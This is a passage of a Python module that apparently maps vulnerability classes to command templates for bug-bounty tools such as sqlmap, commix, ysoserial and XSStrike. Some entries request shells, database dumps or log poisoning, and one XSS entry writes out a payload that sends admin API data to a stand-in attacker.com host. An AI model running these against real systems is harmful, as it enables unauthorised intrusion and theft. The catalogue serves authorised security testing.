from rich.console import Console
from rich.prompt import Prompt
from BugBountyToolsAssistant.utils.command_executor import execute_command

console = Console()

TOOL_COMMANDS = {
    "Command Injection": {
        "Commix": {
            "1": {
                "name": "Basic Scan",
                "command": "commix --url example.com/?parameter=value",
                "description": "Basic command injection scan"
            },
            "2": {
                "name": "POST Request",
                "command": "commix --url example.com --data='parameter=value'",
                "description": "Test POST parameters"
            },
            "3": {
                "name": "Custom Header",
                "command": "commix --url example.com -H 'User-Agent:custom'",
                "description": "Test headers for injection"
            },
            "4": {
                "name": "Verbose Mode",
                "command": "commix --url example.com -v",
                "description": "Show detailed output"
            },
            "5": {
                "name": "With Output",
                "command": "commix --url example.com --output-dir results",
                "description": "Save results to directory"
            }
        }
    },
    "CSRF Injection": {
        "XSRFProbe": {
            "1": {
                "name": "Basic Scan",
                "command": "xsrfprobe -u example.com",
                "description": "Basic CSRF vulnerability scan"
            },
            "2": {
                "name": "Cookie Based",
                "command": "xsrfprobe -u example.com --cookie 'session=value'",
                "description": "Test with specific cookie"
            },
            "3": {
                "name": "Delay Option",
                "command": "xsrfprobe -u example.com --delay 2",
                "description": "Add delay between requests"
            },
            "4": {
                "name": "Output File",
                "command": "xsrfprobe -u example.com --output csrf_results.txt",
                "description": "Save results to file"
            },
            "5": {
                "name": "Verbosity",
                "command": "xsrfprobe -u example.com --verbose",
                "description": "Show detailed output"
            }
        }
    },
    "Directory Traversal": {
        "Dotdotpwn": {
            "1": {
                "name": "HTTP Mode",
                "command": "dotdotpwn -m http -h example.com",
                "description": "Basic HTTP traversal test"
            },
            "2": {
                "name": "Custom Pattern",
                "command": "dotdotpwn -m http -h example.com -p 'file.php'",
                "description": "Test specific file pattern"
            },
            "3": {
                "name": "OS Detection",
                "command": "dotdotpwn -m http -h example.com -O",
                "description": "Enable OS detection"
            },
            "4": {
                "name": "Custom Depth",
                "command": "dotdotpwn -m http -h example.com -d 8",
                "description": "Set traversal depth"
            },
            "5": {
                "name": "Report Generation",
                "command": "dotdotpwn -m http -h example.com -r report.txt",
                "description": "Save results to report"
            }
        },
        "FDsploit": {
            "1": {
                "name": "Basic Scan",
                "command": "fdsploit -u example.com/page.php",
                "description": "Basic directory traversal scan"
            },
            "2": {
                "name": "Parameter Test",
                "command": "fdsploit -u example.com/page.php -p file",
                "description": "Test specific parameter"
            },
            "3": {
                "name": "Custom Wordlist",
                "command": "fdsploit -u example.com/page.php -w wordlist.txt",
                "description": "Use custom wordlist"
            },
            "4": {
                "name": "Output File",
                "command": "fdsploit -u example.com/page.php -o results.txt",
                "description": "Save results to file"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "fdsploit -u example.com/page.php -v",
                "description": "Show detailed output"
            }
        },
        "Off-by-slash": {
            "1": {
                "name": "Basic Scan",
                "command": "off-by-slash -u example.com",
                "description": "Path traversal check"
            },
            "2": {
                "name": "Multiple URLs",
                "command": "off-by-slash -f urls.txt",
                "description": "Scan multiple targets"
            },
            "3": {
                "name": "Custom Depth",
                "command": "off-by-slash -u example.com -d 5",
                "description": "Set traversal depth"
            },
            "4": {
                "name": "Output File",
                "command": "off-by-slash -u example.com -o results.txt",
                "description": "Save results"
            },
            "5": {
                "name": "Threads",
                "command": "off-by-slash -u example.com -t 10",
                "description": "Control thread count"
            }
        },
        "Liffier": {
            "1": {
                "name": "Basic Scan",
                "command": "liffier -u example.com/page.php",
                "description": "Path traversal detection"
            },
            "2": {
                "name": "Custom Pattern",
                "command": "liffier -u example.com/page.php -p 'path=FUZZ'",
                "description": "Use custom pattern"
            },
            "3": {
                "name": "Output File",
                "command": "liffier -u example.com/page.php -o results.txt",
                "description": "Save results"
            },
            "4": {
                "name": "Payload List",
                "command": "liffier -u example.com/page.php -pl payloads.txt",
                "description": "Custom payloads"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "liffier -u example.com/page.php -v",
                "description": "Show detailed output"
            }
        }
    },
    "File Inclusion": {
        "Liffy": {
            "1": {
                "name": "Basic Scan",
                "command": "liffy -u example.com/page.php?file=",
                "description": "Basic file inclusion scan"
            },
            "2": {
                "name": "RFI Mode",
                "command": "liffy -u example.com/page.php?file= --rfi",
                "description": "Remote file inclusion test"
            },
            "3": {
                "name": "Shell Upload",
                "command": "liffy -u example.com/page.php?file= --shell",
                "description": "Try to get shell"
            },
            "4": {
                "name": "Custom Payload",
                "command": "liffy -u example.com/page.php?file= -p payload.txt",
                "description": "Use custom payload"
            },
            "5": {
                "name": "Output Results",
                "command": "liffy -u example.com/page.php?file= -o results.txt",
                "description": "Save findings to file"
            }
        },
        "LFISuite": {
            "1": {
                "name": "Basic Scan",
                "command": "lfisuite --url example.com/page.php?file=",
                "description": "Basic LFI vulnerability scan"
            },
            "2": {
                "name": "Auto Exploit",
                "command": "lfisuite --url example.com/page.php?file= --auto",
                "description": "Automatic exploitation"
            },
            "3": {
                "name": "Custom Payload",
                "command": "lfisuite --url example.com/page.php?file= --payload custom.txt",
                "description": "Use custom payload list"
            },
            "4": {
                "name": "Shell Upload",
                "command": "lfisuite --url example.com/page.php?file= --shell",
                "description": "Attempt shell upload"
            },
            "5": {
                "name": "Stealth Mode",
                "command": "lfisuite --url example.com/page.php?file= --stealth",
                "description": "Reduce detection risk"
            }
        },
        "LFI-Enum": {
            "1": {
                "name": "Basic Scan",
                "command": "lfi-enum -u example.com/page.php?file=",
                "description": "Basic LFI enumeration"
            },
            "2": {
                "name": "OS Detection",
                "command": "lfi-enum -u example.com/page.php?file= --os-detect",
                "description": "Detect target OS"
            },
            "3": {
                "name": "File Search",
                "command": "lfi-enum -u example.com/page.php?file= --find-files",
                "description": "Enumerate files"
            },
            "4": {
                "name": "Log Poisoning",
                "command": "lfi-enum -u example.com/page.php?file= --log-poison",
                "description": "Try log poisoning"
            },
            "5": {
                "name": "Output File",
                "command": "lfi-enum -u example.com/page.php?file= -o results.txt",
                "description": "Save results to file"
            }
        },
        "Burp-LFI-tests": {
            "1": {
                "name": "Basic Test",
                "command": "burp-lfi -u example.com/page.php?file=",
                "description": "Basic LFI testing"
            },
            "2": {
                "name": "Full Scan",
                "command": "burp-lfi -u example.com/page.php?file= --full",
                "description": "Complete scan"
            },
            "3": {
                "name": "Parameter Test",
                "command": "burp-lfi -u example.com/page.php -p file",
                "description": "Test specific parameter"
            },
            "4": {
                "name": "Custom Payloads",
                "command": "burp-lfi -u example.com/page.php?file= -w payloads.txt",
                "description": "Use custom payloads"
            },
            "5": {
                "name": "Export Report",
                "command": "burp-lfi -u example.com/page.php?file= -o report.html",
                "description": "Export HTML report"
            }
        },
        "LFI-files": {
            "1": {
                "name": "Basic Scan",
                "command": "lfi-files -u example.com/page.php?file=",
                "description": "Basic file disclosure test"
            },
            "2": {
                "name": "Linux Mode",
                "command": "lfi-files -u example.com/page.php?file= --linux",
                "description": "Test Linux files"
            },
            "3": {
                "name": "Windows Mode",
                "command": "lfi-files -u example.com/page.php?file= --windows",
                "description": "Test Windows files"
            },
            "4": {
                "name": "Custom Files",
                "command": "lfi-files -u example.com/page.php?file= -f files.txt",
                "description": "Test custom file list"
            },
            "5": {
                "name": "Output Results",
                "command": "lfi-files -u example.com/page.php?file= -o results.txt",
                "description": "Save results to file"
            }
        }
    },
    "GraphQL Injection": {
        "InQL": {
            "1": {
                "name": "Basic Scan",
                "command": "inql -t example.com/graphql",
                "description": "Basic GraphQL endpoint scan"
            },
            "2": {
                "name": "Introspection",
                "command": "inql -t example.com/graphql --introspection",
                "description": "Run introspection query"
            },
            "3": {
                "name": "Custom Query",
                "command": "inql -t example.com/graphql -q query.txt",
                "description": "Execute custom query"
            },
            "4": {
                "name": "Save Results",
                "command": "inql -t example.com/graphql -o output",
                "description": "Save results to directory"
            },
            "5": {
                "name": "Proxy Mode",
                "command": "inql -t example.com/graphql --proxy",
                "description": "Run through proxy"
            }
        },
        "GraphQLmap": {
            "1": {
                "name": "Interactive Mode",
                "command": "graphqlmap -u example.com/graphql",
                "description": "Start interactive console"
            },
            "2": {
                "name": "Schema Dump",
                "command": "graphqlmap -u example.com/graphql --schema",
                "description": "Dump GraphQL schema"
            },
            "3": {
                "name": "Query Dump",
                "command": "graphqlmap -u example.com/graphql --dump-queries",
                "description": "Dump available queries"
            },
            "4": {
                "name": "Mutation Dump",
                "command": "graphqlmap -u example.com/graphql --dump-mutations",
                "description": "Dump available mutations"
            },
            "5": {
                "name": "Injection Test",
                "command": "graphqlmap -u example.com/graphql --inject",
                "description": "Test for injection points"
            }
        },
        "Shapeshifter": {
            "1": {
                "name": "Basic Scan",
                "command": "shapeshifter -u example.com/graphql",
                "description": "Basic GraphQL testing"
            },
            "2": {
                "name": "Auth Bypass",
                "command": "shapeshifter -u example.com/graphql --auth-bypass",
                "description": "Test auth bypass"
            },
            "3": {
                "name": "DoS Test",
                "command": "shapeshifter -u example.com/graphql --dos",
                "description": "Test for DoS vulnerabilities"
            },
            "4": {
                "name": "Introspection",
                "command": "shapeshifter -u example.com/graphql --introspection",
                "description": "Run introspection"
            },
            "5": {
                "name": "Report Generation",
                "command": "shapeshifter -u example.com/graphql -o report.html",
                "description": "Generate HTML report"
            }
        },
        "Clairvoyance": {
            "1": {
                "name": "Schema Extraction",
                "command": "clairvoyance -u example.com/graphql",
                "description": "Extract GraphQL schema"
            },
            "2": {
                "name": "Headers",
                "command": "clairvoyance -u example.com/graphql -H 'Auth: token'",
                "description": "Use custom headers"
            },
            "3": {
                "name": "Output File",
                "command": "clairvoyance -u example.com/graphql -o schema.json",
                "description": "Save schema to file"
            },
            "4": {
                "name": "Force Mode",
                "command": "clairvoyance -u example.com/graphql --force",
                "description": "Force schema extraction"
            },
            "5": {
                "name": "Verbose Output",
                "command": "clairvoyance -u example.com/graphql -v",
                "description": "Detailed output"
            }
        }
    },
    "Header Injection": {
        "Headi": {
            "1": {
                "name": "Basic Check",
                "command": "headi -u example.com",
                "description": "Basic header injection check"
            },
            "2": {
                "name": "Custom Header",
                "command": "headi -u example.com -H 'X-Forwarded-For'",
                "description": "Test specific header"
            },
            "3": {
                "name": "Payload List",
                "command": "headi -u example.com -p payloads.txt",
                "description": "Use custom payloads"
            },
            "4": {
                "name": "Output Results",
                "command": "headi -u example.com -o results.txt",
                "description": "Save findings to file"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "headi -u example.com -v",
                "description": "Show detailed output"
            }
        }
    },
    "Insecure Deserialization": {
        "Ysoserial": {
            "1": {
                "name": "Generate Payload",
                "command": "ysoserial CommonsCollections1 'command'",
                "description": "Generate basic payload"
            },
            "2": {
                "name": "Output File",
                "command": "ysoserial CommonsCollections1 'command' > payload.bin",
                "description": "Save payload to file"
            },
            "3": {
                "name": "List Payloads",
                "command": "ysoserial --help",
                "description": "Show available payloads"
            },
            "4": {
                "name": "Custom Gadget",
                "command": "ysoserial CustomGadget 'command'",
                "description": "Use custom gadget chain"
            },
            "5": {
                "name": "Encoded Output",
                "command": "ysoserial CommonsCollections1 'command' | base64",
                "description": "Generate encoded payload"
            }
        },
        "GadgetProbe": {
            "1": {
                "name": "Basic Scan",
                "command": "gadgetprobe -u example.com/endpoint",
                "description": "Basic deserialization scan"
            },
            "2": {
                "name": "Custom Gadgets",
                "command": "gadgetprobe -u example.com/endpoint -g gadgets.txt",
                "description": "Test custom gadget chains"
            },
            "3": {
                "name": "Output Results",
                "command": "gadgetprobe -u example.com/endpoint -o results.txt",
                "description": "Save results to file"
            },
            "4": {
                "name": "With Headers",
                "command": "gadgetprobe -u example.com/endpoint -H 'Content-Type: application/json'",
                "description": "Include custom headers"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "gadgetprobe -u example.com/endpoint -v",
                "description": "Show detailed output"
            }
        },
        "Ysoserial.net": {
            "1": {
                "name": "Generate Payload",
                "command": "ysoserial.net -g ObjectDataProvider -f Json.Net -c 'command'",
                "description": "Generate .NET payload"
            },
            "2": {
                "name": "List Formatters",
                "command": "ysoserial.net -h",
                "description": "Show available formatters"
            },
            "3": {
                "name": "Output File",
                "command": "ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'command' -o payload.bin",
                "description": "Save payload to file"
            },
            "4": {
                "name": "Base64 Output",
                "command": "ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c 'command' -o payload.txt -b",
                "description": "Generate base64 encoded payload"
            },
            "5": {
                "name": "Custom Gadget",
                "command": "ysoserial.net -g PSObject -f NetDataContractSerializer -c 'command'",
                "description": "Use specific gadget/formatter"
            }
        },
        "Phpggc": {
            "1": {
                "name": "Generate Payload",
                "command": "phpggc Laravel/RCE1 system 'id'",
                "description": "Generate PHP payload"
            },
            "2": {
                "name": "List Gadgets",
                "command": "phpggc -l",
                "description": "List available gadget chains"
            },
            "3": {
                "name": "Base64 Output",
                "command": "phpggc -b Laravel/RCE1 system 'id'",
                "description": "Generate base64 encoded payload"
            },
            "4": {
                "name": "Output File",
                "command": "phpggc Laravel/RCE1 system 'id' -o payload.bin",
                "description": "Save payload to file"
            },
            "5": {
                "name": "URL Encoding",
                "command": "phpggc -u Laravel/RCE1 system 'id'",
                "description": "URL-encode the payload"
            }
        }
    },
    "SQL Injection": {
        "SQLMap": {
            "1": {
                "name": "Basic Scan",
                "command": "sqlmap -u 'example.com/page.php?id=1'",
                "description": "Basic SQL injection scan"
            },
            "2": {
                "name": "Database Dump",
                "command": "sqlmap -u 'example.com/page.php?id=1' --dump",
                "description": "Attempt to dump database"
            },
            "3": {
                "name": "Custom Injection",
                "command": "sqlmap -u 'example.com/page.php?id=1' --technique=U",
                "description": "Use UNION based injection"
            },
            "4": {
                "name": "Risk Level",
                "command": "sqlmap -u 'example.com/page.php?id=1' --risk=3",
                "description": "Higher risk level tests"
            },
            "5": {
                "name": "Shell Access",
                "command": "sqlmap -u 'example.com/page.php?id=1' --os-shell",
                "description": "Attempt to get shell access"
            }
        },
        "NoSQLMap": {
            "1": {
                "name": "Interactive Mode",
                "command": "nosqlmap",
                "description": "Start interactive console"
            },
            "2": {
                "name": "MongoDB Scan",
                "command": "nosqlmap --mongodb example.com:27017",
                "description": "Scan MongoDB instance"
            },
            "3": {
                "name": "Web App Test",
                "command": "nosqlmap --webapp example.com/app",
                "description": "Test web application"
            },
            "4": {
                "name": "Auth Bypass",
                "command": "nosqlmap --webapp example.com/login --auth-bypass",
                "description": "Try authentication bypass"
            },
            "5": {
                "name": "Post Data",
                "command": "nosqlmap --webapp example.com/app --data 'username=test&password=test'",
                "description": "Test with POST data"
            }
        },
        "SleuthQL": {
            "1": {
                "name": "Basic Scan",
                "command": "sleuthql -u example.com",
                "description": "Basic SQL injection scan"
            },
            "2": {
                "name": "Crawling",
                "command": "sleuthql -u example.com --crawl",
                "description": "Crawl site for injection points"
            },
            "3": {
                "name": "Custom Headers",
                "command": "sleuthql -u example.com -H 'Cookie: session=value'",
                "description": "Include custom headers"
            },
            "4": {
                "name": "Output File",
                "command": "sleuthql -u example.com -o results.txt",
                "description": "Save results to file"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "sleuthql -u example.com -v",
                "description": "Show detailed output"
            }
        },
        "Mssqlproxy": {
            "1": {
                "name": "Basic Proxy",
                "command": "mssqlproxy -t example.com:1433",
                "description": "Proxy SQL Server connections"
            },
            "2": {
                "name": "With Credentials",
                "command": "mssqlproxy -t example.com:1433 -u 'user' -p 'pass'",
                "description": "Use authentication"
            },
            "3": {
                "name": "Local Port",
                "command": "mssqlproxy -t example.com:1433 -l 8443",
                "description": "Set local listen port"
            },
            "4": {
                "name": "Packet Capture",
                "command": "mssqlproxy -t example.com:1433 --pcap capture.pcap",
                "description": "Capture traffic"
            },
            "5": {
                "name": "Debug Mode",
                "command": "mssqlproxy -t example.com:1433 --debug",
                "description": "Show debug information"
            }
        },
        "Sqliv": {
            "1": {
                "name": "Single URL",
                "command": "sqliv -t example.com/page.php?id=1",
                "description": "Test single URL"
            },
            "2": {
                "name": "Multiple URLs",
                "command": "sqliv -f urls.txt",
                "description": "Test from file"
            },
            "3": {
                "name": "Google Dork",
                "command": "sqliv -d 'inurl:index.php?id='",
                "description": "Use Google dork"
            },
            "4": {
                "name": "Verbose Mode",
                "command": "sqliv -t example.com/page.php?id=1 -v",
                "description": "Show detailed output"
            },
            "5": {
                "name": "Export Results",
                "command": "sqliv -t example.com/page.php?id=1 -o results.txt",
                "description": "Save results to file"
            }
        }
    },
    "XSS Injection": {
        "XSStrike": {
            "1": {
                "name": "Basic Scan",
                "command": "xsstrike -u example.com/page.php?param=test",
                "description": "Basic XSS vulnerability scan"
            },
            "2": {
                "name": "Crawl & Scan",
                "command": "xsstrike -u example.com --crawl",
                "description": "Crawl and test for XSS"
            },
            "3": {
                "name": "Custom Payload",
                "command": "xsstrike -u example.com -p payloads.txt",
                "description": "Use custom XSS payloads"
            },
            "4": {
                "name": "Blind XSS",
                "command": "xsstrike -u example.com --blind",
                "description": "Test for blind XSS"
            },
            "5": {
                "name": "Parameter Scan",
                "command": "xsstrike -u example.com --params",
                "description": "Scan all parameters"
            }
        },
        "Dalfox": {
            "1": {
                "name": "Basic Scan",
                "command": "dalfox url example.com/page.php?param=test",
                "description": "Basic XSS detection"
            },
            "2": {
                "name": "Multiple URLs",
                "command": "dalfox file urls.txt",
                "description": "Scan from file"
            },
            "3": {
                "name": "Blind XSS",
                "command": "dalfox url example.com/page.php?param=test --blind https://xss.report/",
                "description": "Test for blind XSS"
            },
            "4": {
                "name": "With Headers",
                "command": "dalfox url example.com/page.php?param=test -H 'Cookie: session=value'",
                "description": "Include custom headers"
            },
            "5": {
                "name": "Output File",
                "command": "dalfox url example.com/page.php?param=test -o results.txt",
                "description": "Save results to file"
            }
        },
        "XSpear": {
            "1": {
                "name": "Basic Scan",
                "command": "xspear -u example.com/page.php?param=test",
                "description": "Basic XSS scan"
            },
            "2": {
                "name": "Custom Headers",
                "command": "xspear -u example.com/page.php?param=test -H 'Cookie: session=value'",
                "description": "Include custom headers"
            },
            "3": {
                "name": "Report Generation",
                "command": "xspear -u example.com/page.php?param=test --report",
                "description": "Generate scan report"
            },
            "4": {
                "name": "Output File",
                "command": "xspear -u example.com/page.php?param=test -o results.txt",
                "description": "Save results to file"
            },
            "5": {
                "name": "Concurrency",
                "command": "xspear -u example.com/page.php?param=test -t 10",
                "description": "Set thread count"
            }
        },
        "Xsshunter": {
            "1": {
                "name": "Generate Payload",
                "command": "xsshunter -g yourusername",
                "description": "Generate XSS Hunter payload"
            },
            "2": {
                "name": "Custom Domain",
                "command": "xsshunter -g yourusername -d yourdomain.com",
                "description": "Use custom domain"
            },
            "3": {
                "name": "Payload List",
                "command": "xsshunter -l",
                "description": "List available payloads"
            },
            "4": {
                "name": "Check Status",
                "command": "xsshunter -s",
                "description": "Check service status"
            },
            "5": {
                "name": "Custom Endpoint",
                "command": "xsshunter -g yourusername -e /custom/path",
                "description": "Use custom endpoint"
            }
        },
        "Weaponised-XSS-payloads": {
            "1": {
                "name": "Basic Payload",
                "command": "wxss -g alert",
                "description": "Generate simple alert payload"
            },
            "2": {
                "name": "Specific Browser",
                "command": "wxss -g cookie -b chrome",
                "description": "Browser-specific payload"
            },
            "3": {
                "name": "Data Exfiltration",
                "command": "wxss -g exfil -u https://attacker.com/collect",
                "description": "Cookie stealing payload"
            },
            "4": {
                "name": "Payload List",
                "command": "wxss -l",
                "description": "List available payloads"
            },
            "5": {
                "name": "Custom Command",
                "command": "wxss -g custom 'fetch(\"/api/admin\").then(r=>r.json()).then(d=>fetch(\"https://attacker.com/\"+btoa(JSON.stringify(d))))'",
                "description": "Create custom complex payload"
            }
        }
    },
    "CRLF Injection": {
        "CRLFsuite": {
            "1": {
                "name": "Basic Scan",
                "command": "crlfsuite -u example.com",
                "description": "Basic CRLF injection check"
            },
            "2": {
                "name": "Custom Payload",
                "command": "crlfsuite -u example.com -p payload.txt",
                "description": "Use custom payloads"
            },
            "3": {
                "name": "Output File",
                "command": "crlfsuite -u example.com -o results.txt",
                "description": "Save results to file"
            },
            "4": {
                "name": "Delay Option",
                "command": "crlfsuite -u example.com -d 2",
                "description": "Add delay between requests"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "crlfsuite -u example.com -v",
                "description": "Show detailed output"
            }
        },
        "crlfuzz": {
            "1": {
                "name": "Quick Scan",
                "command": "crlfuzz -u example.com",
                "description": "Fast CRLF fuzzing"
            },
            "2": {
                "name": "With Wordlist",
                "command": "crlfuzz -w payloads.txt -u example.com",
                "description": "Use custom payloads"
            },
            "3": {
                "name": "Silent Mode",
                "command": "crlfuzz -s -u example.com",
                "description": "Only show results"
            },
            "4": {
                "name": "Output Results",
                "command": "crlfuzz -o output.txt -u example.com",
                "description": "Save findings to file"
            },
            "5": {
                "name": "Concurrent Requests",
                "command": "crlfuzz -c 50 -u example.com",
                "description": "Set concurrency level"
            }
        },
        "CRLF-Injection-Scanner": {
            "1": {
                "name": "Basic Scan",
                "command": "crlf-scanner -u example.com",
                "description": "Basic CRLF scan"
            },
            "2": {
                "name": "Multiple URLs",
                "command": "crlf-scanner -f urls.txt",
                "description": "Scan from file"
            },
            "3": {
                "name": "Output File",
                "command": "crlf-scanner -u example.com -o results.txt",
                "description": "Save results"
            },
            "4": {
                "name": "Threads",
                "command": "crlf-scanner -u example.com -t 10",
                "description": "Control thread count"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "crlf-scanner -u example.com -v",
                "description": "Show detailed output"
            }
        },
        "Injectus": {
            "1": {
                "name": "CRLF Mode",
                "command": "injectus -u example.com --crlf",
                "description": "CRLF injection scan"
            },
            "2": {
                "name": "Custom Payload",
                "command": "injectus -u example.com --crlf -p payload.txt",
                "description": "Use custom payload"
            },
            "3": {
                "name": "Headers Test",
                "command": "injectus -u example.com --crlf --headers",
                "description": "Test headers"
            },
            "4": {
                "name": "Cookies Test",
                "command": "injectus -u example.com --crlf --cookies",
                "description": "Test cookies"
            },
            "5": {
                "name": "Output File",
                "command": "injectus -u example.com --crlf -o results.txt",
                "description": "Save results"
            }
        }
    },
    "CORS Misconfiguration": {
        "Corsy": {
            "1": {
                "name": "Basic Scan",
                "command": "corsy -u example.com",
                "description": "Check for CORS misconfigurations"
            },
            "2": {
                "name": "Headers Check",
                "command": "corsy -u example.com --headers",
                "description": "Check specific headers"
            },
            "3": {
                "name": "Output File",
                "command": "corsy -u example.com -o output.txt",
                "description": "Save results to file"
            },
            "4": {
                "name": "Verbose Mode",
                "command": "corsy -u example.com -v",
                "description": "Show detailed output"
            },
            "5": {
                "name": "With Cookies",
                "command": "corsy -u example.com -c 'session=value'",
                "description": "Include cookies in request"
            }
        },
        "CORStest": {
            "1": {
                "name": "Simple Test",
                "command": "corstest -u example.com",
                "description": "Basic CORS testing"
            },
            "2": {
                "name": "All Tests",
                "command": "corstest -u example.com --all",
                "description": "Run all available tests"
            },
            "3": {
                "name": "Custom Origin",
                "command": "corstest -u example.com -o 'evil.com'",
                "description": "Test specific origin"
            },
            "4": {
                "name": "Export Results",
                "command": "corstest -u example.com --output report.txt",
                "description": "Save findings to file"
            },
            "4": {
                "name": "Debug Mode",
                "command": "corstest -u example.com --debug",
                "description": "Show debug information"
            }
        },
        "CorsMe": {
            "1": {
                "name": "Quick Scan",
                "command": "corsme scan example.com",
                "description": "Fast CORS vulnerability scan"
            },
            "2": {
                "name": "Deep Scan",
                "command": "corsme scan -d example.com",
                "description": "Thorough CORS testing"
            },
            "3": {
                "name": "Custom Headers",
                "command": "corsme scan -H 'X-Custom: value' example.com",
                "description": "Include specific headers"
            },
            "4": {
                "name": "Save Report",
                "command": "corsme scan -o report.json example.com",
                "description": "Export results to JSON"
            },
            "5": {
                "name": "Timeout Setting",
                "command": "corsme scan -t 30 example.com",
                "description": "Set request timeout"
            }
        },
        "Cors-scanner": {
            "1": {
                "name": "Basic Scan",
                "command": "cors-scanner -u example.com",
                "description": "Simple CORS scan"
            },
            "2": {
                "name": "Multiple URLs",
                "command": "cors-scanner -f urls.txt",
                "description": "Scan multiple targets"
            },
            "3": {
                "name": "With Proxy",
                "command": "cors-scanner -u example.com -p http://proxy:8080",
                "description": "Use proxy for requests"
            },
            "4": {
                "name": "Threads",
                "command": "cors-scanner -u example.com -t 10",
                "description": "Set thread count"
            },
            "5": {
                "name": "Verbose Output",
                "command": "cors-scanner -u example.com -v",
                "description": "Show detailed information"
            }
        }
    },
    "Insecure Direct Object References": {
        "Autorize": {
            "1": {
                "name": "Basic Scan",
                "command": "autorize -u example.com",
                "description": "Basic IDOR vulnerability scan"
            },
            "2": {
                "name": "Auth Token",
                "command": "autorize -u example.com -t 'Bearer token'",
                "description": "Test with authentication token"
            },
            "3": {
                "name": "Custom Headers",
                "command": "autorize -u example.com -H 'Cookie: session=value'",
                "description": "Test with custom headers"
            },
            "4": {
                "name": "Parameter Test",
                "command": "autorize -u example.com -p id,user_id,account",
                "description": "Test specific parameters"
            },
            "5": {
                "name": "Save Results",
                "command": "autorize -u example.com -o results.txt",
                "description": "Export findings to file"
            }
        }
    },
    "Open Redirect": {
        "Oralyzer": {
            "1": {
                "name": "Basic Scan",
                "command": "oralyzer -u example.com",
                "description": "Basic open redirect scan"
            },
            "2": {
                "name": "Payloads File",
                "command": "oralyzer -u example.com -p payloads.txt",
                "description": "Use custom payloads"
            },
            "3": {
                "name": "Output File",
                "command": "oralyzer -u example.com -o results.txt",
                "description": "Save results to file"
            },
            "4": {
                "name": "Cookies",
                "command": "oralyzer -u example.com -c 'session=value'",
                "description": "Include cookies"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "oralyzer -u example.com -v",
                "description": "Show detailed output"
            }
        },
        "Dom-red": {
            "1": {
                "name": "Quick Check",
                "command": "dom-red scan example.com",
                "description": "Quick DOM-based redirect check"
            },
            "2": {
                "name": "Deep Scan",
                "command": "dom-red scan --deep example.com",
                "description": "Thorough analysis"
            },
            "3": {
                "name": "Custom JS",
                "command": "dom-red scan --js-file script.js",
                "description": "Analyze specific JS file"
            },
            "4": {
                "name": "Export Results",
                "command": "dom-red scan --output report.json example.com",
                "description": "Save findings as JSON"
            },
            "5": {
                "name": "With Headers",
                "command": "dom-red scan --headers headers.txt example.com",
                "description": "Include custom headers"
            }
        },
        "OpenRedireX": {
            "1": {
                "name": "Simple Scan",
                "command": "openredirex -u example.com",
                "description": "Basic redirect vulnerability scan"
            },
            "2": {
                "name": "Wordlist",
                "command": "openredirex -u example.com -w redirects.txt",
                "description": "Use custom payload list"
            },
            "3": {
                "name": "Threads",
                "command": "openredirex -u example.com -t 10",
                "description": "Control thread count"
            },
            "4": {
                "name": "With Proxy",
                "command": "openredirex -u example.com -p http://127.0.0.1:8080",
                "description": "Use proxy server"
            },
            "5": {
                "name": "Save Output",
                "command": "openredirex -u example.com -o results.txt",
                "description": "Export findings to file"
            }
        }
    },
    "Race Condition": {
        "Turbo Intruder": {
            "1": {
                "name": "Basic Race",
                "command": "turbo-intruder -u example.com -n 100",
                "description": "Send 100 concurrent requests"
            },
            "2": {
                "name": "Custom Timing",
                "command": "turbo-intruder -u example.com -d 50 -t 0.1",
                "description": "Set delay and timing"
            },
            "3": {
                "name": "With Payload",
                "command": "turbo-intruder -u example.com -p payload.txt",
                "description": "Use custom payload"
            },
            "4": {
                "name": "Resource Pool",
                "command": "turbo-intruder -u example.com -r 5",
                "description": "Set resource pool size"
            },
            "5": {
                "name": "Export Results",
                "command": "turbo-intruder -u example.com -o results.txt",
                "description": "Save findings to file"
            }
        },
        "Racepwn": {
            "1": {
                "name": "Quick Test",
                "command": "racepwn -u example.com",
                "description": "Basic race condition test"
            },
            "2": {
                "name": "Request Count",
                "command": "racepwn -u example.com -n 1000",
                "description": "Set number of requests"
            },
            "3": {
                "name": "Threads",
                "command": "racepwn -u example.com -t 20",
                "description": "Control thread count"
            },
            "4": {
                "name": "Custom Method",
                "command": "racepwn -u example.com -m POST",
                "description": "Use specific HTTP method"
            },
            "5": {
                "name": "With Data",
                "command": "racepwn -u example.com -d 'param=value'",
                "description": "Include POST data"
            }
        }
    },
    "Request Smuggling": {
        "Smuggler": {
            "1": {
                "name": "Basic Test",
                "command": "smuggler -u example.com",
                "description": "Basic smuggling check"
            },
            "2": {
                "name": "All Tests",
                "command": "smuggler -u example.com --run-all",
                "description": "Run all test cases"
            },
            "3": {
                "name": "Custom Payload",
                "command": "smuggler -u example.com -p payload.txt",
                "description": "Use custom payload"
            },
            "4": {
                "name": "Save Output",
                "command": "smuggler -u example.com -o results.txt",
                "description": "Export results"
            },
            "5": {
                "name": "Verbose Mode",
                "command": "smuggler -u example.com -v",
                "description": "Show detailed output"
            }
        },
        "H2csmuggler": {
            "1": {
                "name": "Quick Check",
                "command": "h2csmuggler -u example.com",
                "description": "Basic H2C smuggling test"
            },
            "2": {
                "name": "Custom Port",
                "command": "h2csmuggler -u example.com -p 8443",
                "description": "Test specific port"
            },
            "3": {
                "name": "With SSL",
                "command": "h2csmuggler -u example.com --ssl",
                "description": "Use SSL/TLS"
            },
            "4": {
                "name": "Wordlist",
                "command": "h2csmuggler -u example.com -w paths.txt",
                "description": "Test multiple paths"
            },
            "5": {
                "name": "Debug Mode",
                "command": "h2csmuggler -u example.com --debug",
                "description": "Show debug information"
            }
        }
    },
    "Server Side Request Forgery": {
        "SSRFmap": {
            "1": {
                "name": "Basic Scan",
                "command": "ssrfmap -u example.com",
                "description": "Basic SSRF vulnerability scan"
            },
            "2": {
                "name": "Custom Payload",
                "command": "ssrfmap -u example.com -p payload.txt",
                "description": "Use custom payload list"
            },
            "3": {
                "name": "With Loot",
                "command": "ssrfmap -u example.com --loot",
                "description": "Save discovered information"
            },
            "4": {
                "name": "Parameter Test",
                "command": "ssrfmap -u example.com -param url,link,src",
                "description": "Test specific parameters"
            },
            "5": {
                "name": "Advanced Mode",
